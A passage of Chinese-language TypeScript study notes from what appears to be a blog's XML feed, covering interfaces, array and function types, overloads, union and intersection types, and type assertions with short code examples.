<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">  <span class="comment">// 加入readonly修饰符代表只读属性</span></span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">cb</span>: <span class="function">()=&gt;</span><span class="built_in">boolean</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">  <span class="attr">cb</span>: <span class="function">()=&gt;</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以调用只读属性</span></span><br><span class="line">a.<span class="title function_">cb</span>()</span><br><span class="line"><span class="comment">// 但不能修改</span></span><br><span class="line"><span class="comment">// a.cb = ()=&gt;true</span></span><br></pre></td></tr></table></figure>

<h1 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h1><p>接口继承，子接口不仅有自己定义的属性，还有着父接口定义的属性</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person2</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">add</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span></span><br><span class="line">  <span class="comment">// 没有add</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: <span class="title class_">Person2</span> = &#123;</span><br><span class="line">  <span class="comment">// name和age必须要有</span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;knn&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="title class_">Infinity</span>,</span><br><span class="line">  <span class="comment">// 而且还得有add</span></span><br><span class="line">  <span class="attr">add</span>: <span class="string">&quot;朽木村&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="定义函数类型"><a href="#定义函数类型" class="headerlink" title="定义函数类型"></a>定义函数类型</h1><p>接口也可以直接定义函数的类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Fn</span> &#123;</span><br><span class="line">  <span class="comment">// 括号内定义函数的参数，冒号后定义函数的返回值</span></span><br><span class="line">  (<span class="attr">name</span>: <span class="built_in">string</span>): <span class="built_in">number</span>[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">fn</span>:<span class="title class_">Fn</span> = <span class="keyword">function</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(name)</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>数组类型</title>
    <url>/web/study/TypeScript/5.%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="数组的类型"><a href="#数组的类型" class="headerlink" title="数组的类型"></a>数组的类型</h1><p>可以使用类型+[]或泛型方式定义数组的类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类型+中括号，这是个由数字组成的数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr</span>:<span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="comment">// 泛型方式也可以</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr2</span>:<span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt; = [<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>]</span><br><span class="line"><span class="comment">// 不能添加不符合类型的数组项</span></span><br><span class="line"><span class="comment">// arr.push(&quot;1&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以定义对象数组</span></span><br><span class="line"><span class="keyword">interface</span> X &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr</span>: X[] = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;knn&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><p>如果需要定义二维数组或多维数组，使用类型+[]形式时，有几维就加几个[]，而泛型形式则是套娃</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二维数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr</span>:<span class="built_in">number</span>[][] = [[<span class="number">1</span>],[<span class="number">2</span>],[<span class="number">3</span>]]</span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr2</span>:<span class="title class_">Array</span>&lt;<span class="title class_">Array</span>&lt;<span class="built_in">number</span>&gt;&gt; = [[<span class="number">1</span>],[<span class="number">2</span>],[<span class="number">3</span>]]</span><br></pre></td></tr></table></figure>

<h1 id="非单一类型的数组"><a href="#非单一类型的数组" class="headerlink" title="非单一类型的数组"></a>非单一类型的数组</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// any数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr</span>:<span class="built_in">any</span>[] = [<span class="number">114</span>, <span class="string">&quot;514&quot;</span>, <span class="literal">true</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用元组定义每一项类型的数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr2</span>:[<span class="built_in">number</span>,<span class="built_in">string</span>,<span class="built_in">boolean</span>] = [<span class="number">114</span>, <span class="string">&quot;514&quot;</span>, <span class="literal">true</span>]</span><br></pre></td></tr></table></figure>

<h1 id="用接口表示数组"><a href="#用接口表示数组" class="headerlink" title="用接口表示数组"></a>用接口表示数组</h1><p>一般用来描述类数组</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">NumberArray</span> &#123;</span><br><span class="line">    <span class="comment">// 索引的类型是数字，这里约束每项也是数字</span></span><br><span class="line">    [<span class="attr">index</span>: <span class="built_in">number</span>]: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">fibonacci</span>: <span class="title class_">NumberArray</span> = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br></pre></td></tr></table></figure>

<h1 id="arguments数组"><a href="#arguments数组" class="headerlink" title="arguments数组"></a>arguments数组</h1><p>也可以给函数的剩余参数定义类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params">...args: <span class="built_in">number</span>[]</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(args)</span><br><span class="line">  <span class="comment">// IArguments是TS自带 类数组的类型</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">IArguments</span> = <span class="variable language_">arguments</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">a</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// IArguments的内容</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IArguments</span> &#123;</span><br><span class="line">  <span class="attr">callee</span>: <span class="title class_">Function</span></span><br><span class="line">  <span class="attr">length</span>: <span class="built_in">number</span></span><br><span class="line">  [<span class="attr">index</span>: <span class="built_in">number</span>]: <span class="built_in">any</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>函数类型</title>
    <url>/web/study/TypeScript/6.%E5%87%BD%E6%95%B0%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="函数的类型"><a href="#函数的类型" class="headerlink" title="函数的类型"></a>函数的类型</h1><p>函数中需要被定义类型的地方有两处：接收的参数和返回值</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数的类型定义在参数后面</span></span><br><span class="line"><span class="comment">// 函数的返回值类型定义在小括号后面</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a:<span class="built_in">number</span>, b:<span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a+b</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">114</span>,<span class="number">514</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数也是一样的</span></span><br><span class="line"><span class="keyword">const</span> sub = (<span class="attr">a</span>:<span class="built_in">number</span>, <span class="attr">b</span>:<span class="built_in">number</span>): <span class="function"><span class="params">number</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a-b</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sub</span>(<span class="number">114</span>,<span class="number">514</span>))</span><br></pre></td></tr></table></figure>

<h1 id="接口定义函数"><a href="#接口定义函数" class="headerlink" title="接口定义函数"></a>接口定义函数</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Add</span> &#123;</span><br><span class="line">    (<span class="attr">a</span>:<span class="built_in">number</span>, <span class="attr">b</span>:<span class="built_in">number</span>): <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="attr">add</span>:<span class="title class_">Add</span> = (<span class="attr">a</span>:<span class="built_in">number</span>, <span class="attr">b</span>:<span class="built_in">number</span>):<span class="function"><span class="params">number</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">add</span>(<span class="number">5</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h1 id="默认值参数和可选参数"><a href="#默认值参数和可选参数" class="headerlink" title="默认值参数和可选参数"></a>默认值参数和可选参数</h1><p>在调用函数时，这两种参数都是非必传值的参数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 给参数指定默认值，没有传对应的参时，则函数体中会使用参数的默认值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a:<span class="built_in">number</span>=<span class="number">114</span>, b:<span class="built_in">number</span>=<span class="number">514</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a+b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 没传值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>())          <span class="comment">// -&gt;628</span></span><br><span class="line"><span class="comment">// 只传了a</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">1919</span>))      <span class="comment">// -&gt;2433</span></span><br><span class="line"><span class="comment">// a和b都传了</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">810</span>,<span class="number">364</span>))   <span class="comment">// -&gt;1174</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 给参数设置可选，该参数可传可不传</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sub</span>(<span class="params">a:<span class="built_in">number</span>, b?:<span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a-b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 只传了a</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sub</span>(<span class="number">114514</span>))    <span class="comment">// -&gt;NaN</span></span><br><span class="line"><span class="comment">// a和b都传了</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sub</span>(<span class="number">1919</span>,<span class="number">810</span>))  <span class="comment">// -&gt;1109</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.参数默认值和参数可选不能设置给同一个参数</span></span><br><span class="line"><span class="comment">// 2.默认值参数和可选参数要放在所有普通参数的后面</span></span><br></pre></td></tr></table></figure>

<h1 id="引用类型参数"><a href="#引用类型参数" class="headerlink" title="引用类型参数"></a>引用类型参数</h1><p>定义接口，并将参数的类型指定为该接口即可</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addAge</span>(<span class="params">user:User</span>):<span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: user.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">age</span>: user.<span class="property">age</span>+<span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">addAge</span>(&#123;<span class="attr">name</span>:<span class="string">&quot;yajue&quot;</span>,<span class="attr">age</span>:<span class="number">23</span>&#125;))  <span class="comment">// -&gt;&#123; name: &#x27;yajue&#x27;, age: 24 &#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h1><p>函数中的剩余参数也可以定义类型（应是某种数组）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 剩余参数被定义为any[]，即可以传任何剩余参数</span></span><br><span class="line"><span class="comment">// 如果剩余参数被定义为string[]，那么剩余参数只能是字符串</span></span><br><span class="line"><span class="keyword">const</span> fn = (<span class="attr">array</span>:<span class="built_in">number</span>[],...<span class="attr">items</span>:<span class="built_in">any</span>[]):<span class="built_in">any</span>[] =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(array,items)</span><br><span class="line">  <span class="keyword">return</span> items</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>:<span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="title function_">fn</span>(a,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="函数this类型"><a href="#函数this类型" class="headerlink" title="函数this类型"></a>函数this类型</h1><p>TS可以定义this的类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Obj</span> &#123;</span><br><span class="line">  <span class="attr">user</span>:<span class="built_in">number</span>[]</span><br><span class="line">  <span class="attr">add</span>:<span class="function">(<span class="params"><span class="variable language_">this</span>:Obj,num:<span class="built_in">number</span></span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">obj</span>:<span class="title class_">Obj</span> = &#123;</span><br><span class="line">  <span class="attr">user</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">  <span class="comment">// 必须在第一个参数定义this的类型</span></span><br><span class="line">  <span class="comment">// 在JS里不能定义this的类型，JS会把this当成普通的参数名</span></span><br><span class="line">  <span class="title function_">add</span>(<span class="params"><span class="variable language_">this</span>:Obj,num:<span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 定义this类型后，在函数体内使用this就有代码提示了</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">push</span>(num)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">user</span>)  <span class="comment">// -&gt;[ 1, 2, 3, 4 ]</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 传参时忽略this</span></span><br><span class="line">obj.<span class="title function_">add</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<h1 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h1><p>可以根据参数和返回值类型的不同，让一个函数实现不同的功能</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">user</span>:<span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明三个函数重载</span></span><br><span class="line"><span class="comment">// 如果传的是number类型的数组，就做添加</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findNum</span>(<span class="params">add:<span class="built_in">number</span>[]</span>):<span class="built_in">number</span>[]</span><br><span class="line"><span class="comment">// 如果传的是一个number，就单个查询</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findNum</span>(<span class="params">id:<span class="built_in">number</span></span>):<span class="built_in">number</span>[]</span><br><span class="line"><span class="comment">// 如果没有传参，就查询全部</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findNum</span>(<span class="params"></span>):<span class="built_in">number</span>[]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现函数重载</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findNum</span>(<span class="params">ids?:<span class="built_in">number</span>|<span class="built_in">number</span>[]</span>):<span class="built_in">number</span>[] &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> ids == <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果传入的是数字，就单个查询</span></span><br><span class="line">    <span class="keyword">return</span> user.<span class="title function_">filter</span>(<span class="function"><span class="params">v</span>=&gt;</span>v==ids)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title class_">Array</span>.<span class="title function_">isArray</span>(ids)) &#123;</span><br><span class="line">    <span class="comment">// 如果传的是一个number，就单个查询</span></span><br><span class="line">    user.<span class="title function_">push</span>(...ids)</span><br><span class="line">    <span class="keyword">return</span> user</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果没有传参，就查询全部</span></span><br><span class="line">    <span class="keyword">return</span> user</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>联合类型、交叉类型和类型断言</title>
    <url>/web/study/TypeScript/7.%E8%81%94%E5%90%88%E7%B1%BB%E5%9E%8B%E3%80%81%E4%BA%A4%E5%8F%89%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%B1%BB%E5%9E%8B%E6%96%AD%E8%A8%80.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h1><p>有时可能出现一个变量需支持多种类型的情况</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 联合类型，每个类型间用|断开</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">phone</span>:<span class="built_in">number</span>|<span class="built_in">string</span></span><br><span class="line">phone = <span class="number">13000000000</span>       <span class="comment">// OK</span></span><br><span class="line">phone = <span class="string">&quot;130-0000-0000&quot;</span>   <span class="comment">// OK</span></span><br><span class="line">phone = <span class="literal">false</span>             <span class="comment">// 不OK，联合类型里不包含boolean</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数中也可以使用联合类型</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">function</span>(<span class="params"><span class="keyword">type</span>:<span class="built_in">number</span>|<span class="built_in">boolean</span></span>):<span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> !!<span class="keyword">type</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="交叉类型"><a href="#交叉类型" class="headerlink" title="交叉类型"></a>交叉类型</h1><p>有时可能出现需要将两个类型（接口）合并的情况</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">People</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Place</span> &#123;</span><br><span class="line">  <span class="attr">address</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// man的类型是People和Place的总和</span></span><br><span class="line"><span class="keyword">const</span> live = (<span class="attr">man</span>:<span class="title class_">People</span>&amp;<span class="title class_">Place</span>):<span class="function"><span class="params">void</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(man)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入的参数需要同时拥有People和Place的属性，name、age和address</span></span><br><span class="line"><span class="title function_">live</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="number">24</span>,</span><br><span class="line">  <span class="attr">address</span>:<span class="string">&quot;下北泽&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h1><p>告诉TS某个变量一定是某个类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = (<span class="attr">str</span>:<span class="built_in">number</span>|<span class="built_in">string</span>):<span class="function"><span class="params">void</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 当num为number时，它是不存在length属性的</span></span><br><span class="line">  <span class="comment">// 可以使用类型断言，告诉TS，num是string</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>((str <span class="keyword">as</span> <span class="built_in">string</span>).<span class="property">length</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非必要不使用类型断言，比如此处无法保证num一定是string</span></span><br><span class="line"><span class="comment">// 滥用类型断言可能导致运行时错误</span></span><br><span class="line"><span class="title function_">fn</span>(<span class="string">&quot;12345&quot;</span>)   <span class="comment">// -&gt;5</span></span><br><span class="line"><span class="title function_">fn</span>(<span class="number">67890</span>)     <span class="comment">// -&gt;undefined</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">foo</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> B &#123;</span><br><span class="line">  <span class="attr">bar</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fn2 = (<span class="attr">foobar</span>:A|B):<span class="function"><span class="params">void</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 复杂类型也可以断言</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>((foobar <span class="keyword">as</span> A).<span class="property">foo</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn2</span>(&#123;<span class="attr">foo</span>:<span class="string">&quot;yajue&quot;</span>&#125;)  <span class="comment">// -&gt;&quot;yajue&quot;</span></span><br><span class="line"><span class="title function_">fn2</span>(&#123;<span class="attr">bar</span>:<span class="string">&quot;yjsp&quot;</span>&#125;)   <span class="comment">// -&gt;undefined</span></span><br></pre></td></tr></table></figure>

<p>类型断言常用在使用服务器环境全局变量的场景中</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错，因为window没有abc属性</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">abc</span> = <span class="number">123</span></span><br><span class="line"><span class="comment">// 临时断言为any，在any类型的变量上，访问任何属性都是允许的</span></span><br><span class="line">(<span class="variable language_">window</span> <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">abc</span> = <span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>类型断言只能欺骗TS编译器，并不会真的去转换类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = (<span class="attr">type</span>:<span class="built_in">any</span>):<span class="function"><span class="params">boolean</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">type</span> <span class="keyword">as</span> <span class="built_in">boolean</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fn</span>(<span class="number">1</span>))         <span class="comment">// -&gt;1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fn</span>(<span class="string">&quot;yajue&quot;</span>))   <span class="comment">// -&gt;&quot;yajue&quot;</span></span><br></pre></td></tr></table></figure>

<p>也可以使用as const对字面量进行断言，它与用const定义常量是有区别的</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name1 = <span class="string">&quot;nyn&quot;</span> <span class="keyword">as</span> <span class="keyword">const</span></span><br><span class="line"><span class="keyword">const</span> name2 = <span class="string">&quot;yajue&quot;</span></span><br><span class="line"></span><br><span class="line">name1 = <span class="string">&quot;mouse&quot;</span>  <span class="comment">// 无法修改，因为name1被断言为了字面量&quot;nyn&quot;</span></span><br><span class="line">name2 = <span class="string">&quot;yjsp&quot;</span>    <span class="comment">// 无法修改，因为name2是常量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a1 = [<span class="number">10</span>, <span class="number">20</span>] <span class="keyword">as</span> <span class="keyword">const</span></span><br><span class="line"><span class="keyword">const</span> a2 = [<span class="number">10</span>, <span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">a1.<span class="title function_">unshift</span>(<span class="number">30</span>)    <span class="comment">// 无法修改，因为a1被断言为了字面量[10, 20]</span></span><br><span class="line">a2.<span class="title function_">unshift</span>(<span class="number">30</span>)    <span class="comment">// 可以修改，因为没有改变a2的引用</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>内置对象</title>
    <url>/web/study/TypeScript/8.%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<p>JS中有很多内置对象，它们可以直接在TS中当作被定义好了的类型</p>
<h1 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h1><p>ES内置对象实例的类型名和构造器名一致</p>
